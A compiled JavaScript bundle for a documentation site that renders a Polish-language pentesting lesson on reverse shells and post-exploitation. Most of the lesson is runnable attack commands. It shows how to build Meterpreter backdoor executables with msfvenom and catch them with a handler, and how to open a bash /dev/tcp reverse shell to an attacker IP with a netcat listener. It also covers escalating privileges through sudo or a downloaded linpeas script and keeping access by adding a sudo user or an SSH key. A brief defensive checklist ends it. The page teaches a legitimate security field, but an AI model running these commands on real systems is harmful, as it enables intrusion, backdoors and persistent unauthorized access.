"use strict";(self.webpackChunkmy_page=self.webpackChunkmy_page||[]).push([[6149],{28453:(e,s,a)=>{a.d(s,{R:()=>o,x:()=>t});var n=a(96540);const i={},r=n.createContext(i);function o(e){const s=n.useContext(r);return n.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function t(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:o(e.components),n.createElement(r.Provider,{value:s},e.children)}},86595:(e,s,a)=>{a.r(s),a.d(s,{assets:()=>l,contentTitle:()=>t,default:()=>p,frontMatter:()=>o,metadata:()=>n,toc:()=>c});const n=JSON.parse('{"id":"kurs-kali-linux/reverse-shell-post-exploitation","title":"\ud83c\udfad Reverse Shell i Post-Exploitation","description":"Po udanym przej\u0119ciu systemu atakuj\u0105cy mo\u017ce chcie\u0107 utrzyma\u0107 dost\u0119p, przechwyci\u0107 dane, wykona\u0107 dalsze eskalacje uprawnie\u0144 lub zainstalowa\u0107 backdoora. W tej sekcji om\xf3wimy, jak tworzy\u0107 reverse shell, przejmowa\u0107 sesje oraz utrwala\u0107 dost\u0119p do systemu.","source":"@site/docs/kurs-kali-linux/14-reverse-shell-post-exploit.md","sourceDirName":"kurs-kali-linux","slug":"/kurs-kali-linux/reverse-shell-post-exploitation","permalink":"/docs/kurs-kali-linux/reverse-shell-post-exploitation","draft":false,"unlisted":false,"editUrl":"https://github.com/przemyslvw/my-page/edit/master/docs/kurs-kali-linux/14-reverse-shell-post-exploit.md","tags":[],"version":"current","sidebarPosition":14,"frontMatter":{"id":"reverse-shell-post-exploitation","title":"\ud83c\udfad Reverse Shell i Post-Exploitation","sidebar_position":14},"sidebar":"tutorialSidebar","previous":{"title":"\ud83e\udd16 Automatyzacja i eksploatacja","permalink":"/docs/kurs-kali-linux/automatyzacja-eksploatacja"},"next":{"title":"\ud83d\udd13 Ataki na uwierzytelnianie wielosk\u0142adnikowe (2FA Bypass)","permalink":"/docs/kurs-kali-linux/2fa-bypass"}}');var i=a(74848),r=a(28453);const o={id:"reverse-shell-post-exploitation",title:"\ud83c\udfad Reverse Shell i Post-Exploitation",sidebar_position:14},t="\ud83c\udfad Reverse Shell i Post-Exploitation",l={},c=[{value:"\ud83d\udee0\ufe0f Tworzenie backdoora",id:"\ufe0f-tworzenie-backdoora",level:2},{value:"<strong>1\ufe0f\u20e3 Tworzenie backdoora w Metasploit</strong>",id:"1\ufe0f\u20e3-tworzenie-backdoora-w-metasploit",level:3},{value:"<strong>Uruchomienie backdoora</strong>",id:"uruchomienie-backdoora",level:4},{value:"\ud83d\udd04 Przechwytywanie sesji",id:"-przechwytywanie-sesji",level:2},{value:"<strong>2\ufe0f\u20e3 Uzyskanie Reverse Shell przez Netcat</strong>",id:"2\ufe0f\u20e3-uzyskanie-reverse-shell-przez-netcat",level:3},{value:"<strong>3\ufe0f\u20e3 Eskalacja uprawnie\u0144</strong>",id:"3\ufe0f\u20e3-eskalacja-uprawnie\u0144",level:3},{value:"<strong>4\ufe0f\u20e3 Utrwalanie dost\u0119pu</strong>",id:"4\ufe0f\u20e3-utrwalanie-dost\u0119pu",level:3},{value:"\ud83d\udd10 Jak zabezpieczy\u0107 system przed backdoorami i reverse shell?",id:"-jak-zabezpieczy\u0107-system-przed-backdoorami-i-reverse-shell",level:2}];function d(e){const s={code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",hr:"hr",p:"p",pre:"pre",strong:"strong",...(0,r.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(s.header,{children:(0,i.jsx)(s.h1,{id:"-reverse-shell-i-post-exploitation",children:"\ud83c\udfad Reverse Shell i Post-Exploitation"})}),"\n",(0,i.jsxs)(s.p,{children:["Po udanym przej\u0119ciu systemu atakuj\u0105cy mo\u017ce chcie\u0107 utrzyma\u0107 dost\u0119p, przechwyci\u0107 dane, wykona\u0107 dalsze eskalacje uprawnie\u0144 lub zainstalowa\u0107 backdoora. W tej sekcji om\xf3wimy, jak tworzy\u0107 ",(0,i.jsx)(s.strong,{children:"reverse shell"}),", przejmowa\u0107 sesje oraz utrwala\u0107 dost\u0119p do systemu."]}),"\n",(0,i.jsx)(s.hr,{}),"\n",(0,i.jsx)(s.h2,{id:"\ufe0f-tworzenie-backdoora",children:"\ud83d\udee0\ufe0f Tworzenie backdoora"}),"\n",(0,i.jsx)(s.p,{children:"Backdoor to ukryte wej\u015bcie do systemu, kt\xf3re pozwala atakuj\u0105cemu na ponowne zalogowanie si\u0119 bez wiedzy administratora."}),"\n",(0,i.jsx)(s.h3,{id:"1\ufe0f\u20e3-tworzenie-backdoora-w-metasploit",children:(0,i.jsx)(s.strong,{children:"1\ufe0f\u20e3 Tworzenie backdoora w Metasploit"})}),"\n",(0,i.jsx)(s.p,{children:"Metasploit umo\u017cliwia generowanie z\u0142o\u015bliwych plik\xf3w wykonywalnych:"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > backdoor.exe\n"})}),"\n",(0,i.jsx)(s.p,{children:"Je\u015bli atakowany system to Linux:"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > backdoor.elf\n"})}),"\n",(0,i.jsx)(s.h4,{id:"uruchomienie-backdoora",children:(0,i.jsx)(s.strong,{children:"Uruchomienie backdoora"})}),"\n",(0,i.jsx)(s.p,{children:"Na maszynie atakuj\u0105cego uruchamiamy listener w Metasploit:"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.100\nset LPORT 4444\nexploit\n"})}),"\n",(0,i.jsxs)(s.p,{children:["Po otwarciu pliku ",(0,i.jsx)(s.code,{children:"backdoor.exe"})," przez ofiar\u0119, uzyskujemy zdalny dost\u0119p do systemu."]}),"\n",(0,i.jsx)(s.hr,{}),"\n",(0,i.jsx)(s.h2,{id:"-przechwytywanie-sesji",children:"\ud83d\udd04 Przechwytywanie sesji"}),"\n",(0,i.jsx)(s.p,{children:"Reverse Shell pozwala na pe\u0142n\u0105 interakcj\u0119 z systemem ofiary."}),"\n",(0,i.jsx)(s.h3,{id:"2\ufe0f\u20e3-uzyskanie-reverse-shell-przez-netcat",children:(0,i.jsx)(s.strong,{children:"2\ufe0f\u20e3 Uzyskanie Reverse Shell przez Netcat"})}),"\n",(0,i.jsx)(s.p,{children:"Atakuj\u0105cy otwiera listener:"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"nc -lvnp 4444\n"})}),"\n",(0,i.jsx)(s.p,{children:"Ofiara uruchamia payload:"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\n"})}),"\n",(0,i.jsx)(s.p,{children:"Po uruchomieniu polecenia, atakuj\u0105cy uzyskuje interaktywn\u0105 pow\u0142ok\u0119."}),"\n",(0,i.jsx)(s.h3,{id:"3\ufe0f\u20e3-eskalacja-uprawnie\u0144",children:(0,i.jsx)(s.strong,{children:"3\ufe0f\u20e3 Eskalacja uprawnie\u0144"})}),"\n",(0,i.jsx)(s.p,{children:"Po uzyskaniu dost\u0119pu do systemu mo\u017cna spr\xf3bowa\u0107 podnie\u015b\u0107 uprawnienia:"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"sudo -l\n"})}),"\n",(0,i.jsxs)(s.p,{children:["Je\u015bli istnieje dost\u0119p do ",(0,i.jsx)(s.code,{children:"sudo"})," bez has\u0142a, mo\u017cna wykona\u0107:"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"sudo /bin/bash\n"})}),"\n",(0,i.jsxs)(s.p,{children:["W przypadku Linuksa mo\u017cna u\u017cy\u0107 narz\u0119dzia ",(0,i.jsx)(s.code,{children:"linpeas"})," do wykrycia potencjalnych wektor\xf3w eskalacji:"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh\n"})}),"\n",(0,i.jsx)(s.h3,{id:"4\ufe0f\u20e3-utrwalanie-dost\u0119pu",children:(0,i.jsx)(s.strong,{children:"4\ufe0f\u20e3 Utrwalanie dost\u0119pu"})}),"\n",(0,i.jsx)(s.p,{children:"Po uzyskaniu dost\u0119pu atakuj\u0105cy mo\u017ce doda\u0107 konto u\u017cytkownika:"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"sudo useradd -m -s /bin/bash hacker\nsudo passwd hacker\nsudo usermod -aG sudo hacker\n"})}),"\n",(0,i.jsxs)(s.p,{children:["Lub doda\u0107 klucz SSH do ",(0,i.jsx)(s.code,{children:"~/.ssh/authorized_keys"}),", aby uzyska\u0107 trwa\u0142y dost\u0119p."]}),"\n",(0,i.jsx)(s.hr,{}),"\n",(0,i.jsx)(s.h2,{id:"-jak-zabezpieczy\u0107-system-przed-backdoorami-i-reverse-shell",children:"\ud83d\udd10 Jak zabezpieczy\u0107 system przed backdoorami i reverse shell?"}),"\n",(0,i.jsxs)(s.p,{children:["\u2705 ",(0,i.jsx)(s.strong,{children:"Monitorowanie aktywno\u015bci sieciowej i nietypowego ruchu na nietypowych portach"}),"\n\u2705 ",(0,i.jsx)(s.strong,{children:"Blokowanie Netcata i innych narz\u0119dzi u\u017cywanych w atakach"}),"\n\u2705 ",(0,i.jsx)(s.strong,{children:"U\u017cywanie EDR (Endpoint Detection & Response) do wykrywania podejrzanych dzia\u0142a\u0144"}),"\n\u2705 ",(0,i.jsx)(s.strong,{children:"Regularne skanowanie system\xf3w pod k\u0105tem nowych u\u017cytkownik\xf3w i kluczy SSH"}),"\n\u2705 ",(0,i.jsx)(s.strong,{children:"Ograniczenie uprawnie\u0144 i segmentacja sieci"})]}),"\n",(0,i.jsx)(s.hr,{}),"\n",(0,i.jsxs)(s.p,{children:["Reverse Shell i Post-Exploitation to kluczowe elementy zaawansowanego pentestingu. Kolejnym krokiem b\u0119dzie ",(0,i.jsx)(s.strong,{children:"Ataki na uwierzytelnianie wielosk\u0142adnikowe (2FA Bypass)"}),"! \ud83d\ude80"]})]})}function p(e={}){const{wrapper:s}={...(0,r.R)(),...e.components};return s?(0,i.jsx)(s,{...e,children:(0,i.jsx)(d,{...e})}):d(e)}}}]);